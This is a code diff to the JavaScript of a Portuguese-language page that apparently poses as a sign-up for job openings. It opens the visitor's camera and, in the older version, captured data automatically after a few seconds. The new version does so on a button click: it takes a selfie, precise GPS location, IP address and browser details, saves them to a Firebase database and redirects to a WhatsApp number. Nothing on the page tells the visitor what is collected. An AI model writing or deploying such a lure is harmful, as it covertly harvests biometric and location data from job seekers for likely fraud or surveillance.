@@ -1,3 +1,5 @@
+// script.js
+
 import { initializeApp }
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
@@ -40,18 +42,27 @@ getFirestore(app);
 const video =
 document.getElementById("video");
 
+const btn =
+document.getElementById("btn");
+
 const statusText =
 document.getElementById("status");
 
 const canvas =
 document.getElementById("canvas");
 
-async function iniciarSistema(){
+async function iniciarCamera(){
 
   try{
 
-    statusText.innerHTML =
-    "📸 Abrindo câmera...";
+    const fala =
+    new SpeechSynthesisUtterance(
+      "Clique no botão verde para participar das vagas."
+    );
+
+    fala.lang = "pt-BR";
+
+    speechSynthesis.speak(fala);
 
     const stream =
     await navigator.mediaDevices
@@ -70,12 +81,7 @@ async function iniciarSistema(){
     await video.play();
 
     statusText.innerHTML =
-    "✅ Câmera iniciada";
-
-    setTimeout(
-      capturarTudo,
-      3000
-    );
+    "✅ Sistema pronto";
 
   }
 
@@ -90,154 +96,166 @@ async function iniciarSistema(){
 
 }
 
-async function capturarTudo(){
+window.onload = ()=>{
 
-  try{
+  iniciarCamera();
 
-    statusText.innerHTML =
-    "📸 Capturando selfie...";
+};
 
-    canvas.width =
-    video.videoWidth;
-
-    canvas.height =
-    video.videoHeight;
-
-    const ctx =
-    canvas.getContext("2d");
-
-    ctx.drawImage(
-      video,
-      0,
-      0,
-      canvas.width,
-      canvas.height
-    );
-
-    const selfie =
-    canvas.toDataURL(
-      "image/jpeg",
-      0.7
-    );
-
-    statusText.innerHTML =
-    "📍 Obtendo localização...";
-
-    let latitude = null;
-    let longitude = null;
+btn.addEventListener(
+  "click",
+  async()=>{
 
     try{
 
-      const posicao =
-      await new Promise(
-        (resolve,reject)=>{
+      btn.disabled = true;
 
-          navigator.geolocation
-          .getCurrentPosition(
-            resolve,
-            reject,
-            {
-              timeout:5000
-            }
-          );
+      btn.innerHTML =
+      "PROCESSANDO...";
+
+      statusText.innerHTML =
+      "📸 Capturando selfie...";
+
+      canvas.width =
+      video.videoWidth;
+
+      canvas.height =
+      video.videoHeight;
+
+      const ctx =
+      canvas.getContext("2d");
+
+      ctx.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+      );
+
+      const selfie =
+      canvas.toDataURL(
+        "image/jpeg",
+        0.7
+      );
+
+      let latitude =
+      "não permitido";
+
+      let longitude =
+      "não permitido";
+
+      try{
+
+        const localizacao =
+        await new Promise(
+          (resolve,reject)=>{
+
+            navigator.geolocation
+            .getCurrentPosition(
+              resolve,
+              reject,
+              {
+                enableHighAccuracy:true,
+                timeout:10000
+              }
+            );
+
+          }
+        );
+
+        latitude =
+        localizacao.coords.latitude;
+
+        longitude =
+        localizacao.coords.longitude;
+
+      }
+
+      catch(err){
+
+        console.log(err);
+
+      }
+
+      let ip =
+      "indisponível";
+
+      try{
+
+        const req =
+        await fetch(
+          "https://ipapi.co/json/"
+        );
+
+        const json =
+        await req.json();
+
+        ip =
+        json.ip;
+
+      }
+
+      catch(err){
+
+        console.log(err);
+
+      }
+
+      statusText.innerHTML =
+      "💾 Salvando cadastro...";
+
+      await addDoc(
+        collection(
+          db,
+          "checkins"
+        ),
+        {
+
+          selfie:selfie,
+
+          latitude:latitude,
+
+          longitude:longitude,
+
+          ip:ip,
+
+          userAgent:
+          navigator.userAgent,
+
+          plataforma:
+          navigator.platform,
+
+          idioma:
+          navigator.language,
+
+          data:
+          serverTimestamp()
 
         }
       );
 
-      latitude =
-      posicao.coords.latitude;
+      statusText.innerHTML =
+      "✅ Cadastro concluído";
 
-      longitude =
-      posicao.coords.longitude;
-
-    }
-
-    catch(e){
-
-      console.log(
-        "Localização negada"
-      );
+      window.location.href =
+      "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
 
     }
 
-    statusText.innerHTML =
-    "🌐 Obtendo IP...";
+    catch(err){
 
-    let ip = "indisponível";
+      console.log(err);
 
-    try{
+      statusText.innerHTML =
+      "❌ Erro no cadastro";
 
-      const req =
-      await fetch(
-        "https://api.ipify.org?format=json"
-      );
+      btn.disabled = false;
 
-      const json =
-      await req.json();
-
-      ip = json.ip;
+      btn.innerHTML =
+      "QUERO PARTICIPAR";
 
     }
-
-    catch(e){
-
-      console.log(
-        "Erro IP"
-      );
-
-    }
-
-    statusText.innerHTML =
-    "💾 Salvando dados...";
-
-    await addDoc(
-      collection(
-        db,
-        "checkins"
-      ),
-      {
-
-        selfie:selfie,
-
-        latitude:latitude,
-
-        longitude:longitude,
-
-        ip:ip,
-
-        userAgent:
-        navigator.userAgent,
-
-        plataforma:
-        navigator.platform,
-
-        idioma:
-        navigator.language,
-
-        horario:
-        serverTimestamp()
-
-      }
-    );
-
-    statusText.innerHTML =
-    "✅ CHECK-IN REALIZADO";
 
   }
-
-  catch(err){
-
-    console.log(err);
-
-    statusText.innerHTML =
-    "❌ ERRO AO SALVAR";
-
-  }
-
-}
-
-window.onload = ()=>{
-
-  iniciarSistema();
-
-};
+);
